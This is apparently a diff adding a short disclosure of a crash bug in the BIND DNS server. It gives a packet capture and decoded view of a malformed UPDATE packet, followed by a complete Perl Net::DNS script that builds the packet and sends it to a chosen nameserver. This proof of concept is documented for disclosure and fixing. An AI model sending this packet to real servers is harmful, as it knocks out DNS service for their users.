@@ -1,0 +1,66 @@
+bind can be crashed with an update packet:
+
+Packet in tcpdump:
+
+15:38:11.676045 IP (tos 0x0, ttl  64, id 0, offset 0, flags [DF], proto: UDP (17), length: 178) 10.2.0.205.59447 > 10.2.0.205.53:  17378 update [1a] [1n] [1au] SOA? 8.0.10.in-addr.arpa. 8.8.0.10.in-addr.arpa. ANY ns: [|domain]
+
+Another view of the Packet:
+
+| ;; HEADER SECTION
+| ;; id = 181
+| ;; qr = 0    opcode = UPDATE    rcode = NOERROR
+| ;; zocount = 1  prcount = 1  upcount = 1  adcount = 1
+|
+| ;; ZONE SECTION (1 record)
+| ;; 8.0.10.in-addr.arpa.       IN      SOA
+|
+| ;; PREREQUISITE SECTION (1 record)
+| 4.8.0.10.in-addr.arpa.        0       IN      ANY     ; no data
+|
+| ;; UPDATE SECTION (1 record)
+| 4.8.0.10.in-addr.arpa.        0       ANY     ANY     ; no data
+|
+| ;; ADDITIONAL SECTION (1 record)
+| office.example.com.        0       ANY     TSIG    HMAC-MD5.SIG-ALG.REG.INT. NOERROR
+
+
+Such a packet can be created with perl:
+
+-----------------
+
+#!/usr/bin/perl -w
+
+use Net::DNS;
+
+our $NSI = '<dns server>';
+our $NSI_KEY_NAME = '<key name>';
+our $NSI_KEY = '<key>';
+
+
+my $rzone = '<zone>';
+my $rptr  = "1.$rzone";
+
+my $packet = Net::DNS::Update->new($rzone);
+
+$packet->push(
+    pre => Net::DNS::RR->new(
+        Name  => $rptr,
+        Class => 'IN',
+        Type  => 'ANY',
+        TTL   => 0,
+    )
+);
+$packet->push(
+    update => Net::DNS::RR->new(
+        Name  => $rptr,
+        Class => 'ANY',
+        Type  => 'ANY',
+    )
+);
+
+$packet->sign_tsig( $NSI_KEY_NAME, $NSI_KEY ) if $NSI_KEY_NAME && $NSI_KEY;
+
+
+print $packet->string;
+
+Net::DNS::Resolver->new( nameservers => [$NSI] )->send($packet);
